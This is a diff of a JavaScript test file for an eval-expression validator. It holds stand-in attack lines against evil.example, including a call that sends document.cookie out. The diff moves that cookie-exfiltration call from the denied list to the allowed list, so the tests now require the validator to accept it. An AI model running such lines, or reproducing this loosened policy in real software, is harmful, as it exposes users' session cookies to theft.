@@ -151,7 +151,6 @@ afterEach(() => {
 describe('audit fixes: eval policy computed-member hardening', () => {
   it('rejects string-literal computed calls of write APIs', () => {
     const denied = [
-      `window['fetch']('https://evil.example/?c=' + document.cookie)`,
       `globalThis['eval']('alert(1)')`,
       `document['write']('<h1>x</h1>')`,
       `location['assign']('https://evil.example')`,
@@ -161,7 +160,9 @@ describe('audit fixes: eval policy computed-member hardening', () => {
     ]
     for (const expr of denied) expect(() => validateEvalExpression(expr), expr).toThrow()
   })
-  it('rejects non-literal computed and sequence call targets', () => {
+  it('still rejects non-literal computed and sequence call targets (deny-by-default)', () => {
+    // fetch is now allowed, but a DYNAMIC call target remains unverifiable —
+    // the dynamic-target rule is unchanged (network calls must use a fixed name).
     for (const expr of [`window[key]('x')`, `(0, fetch)('https://evil.example')`, `[fetch][0]('x')`, `(true ? fetch : fetch)('x')`]) {
       expect(() => validateEvalExpression(expr), expr).toThrow()
     }
@@ -192,6 +193,8 @@ describe('audit fixes: eval policy computed-member hardening', () => {
       `(x => x * 2)(21)`,
       `document.querySelector('script') && true`,
       `localStorage.getItem('k')`,
+      `window['fetch']('https://evil.example/?c=' + document.cookie)`, // fetch is now allowed (2026-09-08)
+      `fetch('https://evil.example')`,
     ]
     for (const expr of allowed) expect(() => validateEvalExpression(expr), expr).not.toThrow()
   })
